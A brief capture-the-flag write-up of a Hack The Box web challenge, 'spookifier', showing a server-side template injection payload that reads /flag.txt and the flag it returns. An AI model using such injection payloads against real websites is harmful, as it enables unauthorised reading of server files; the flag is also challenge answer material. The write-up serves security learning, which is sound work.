# web_spookifier (2)

The website return our input with 4 differents fonts. \
The first three fonts are spooky fonts, which can only translate alphabetic chars. \
But the last font is the normal font, we also have numeric and some special characters (including `$`, quotes, and curly brackets...)

We try to inject some code and it works !

Payload:
```python
${open("/flag.txt").read()}
```

Result:
```
HTB{t3mpl4t3_1nj3ct10n_1s_$p00ky!!}
```
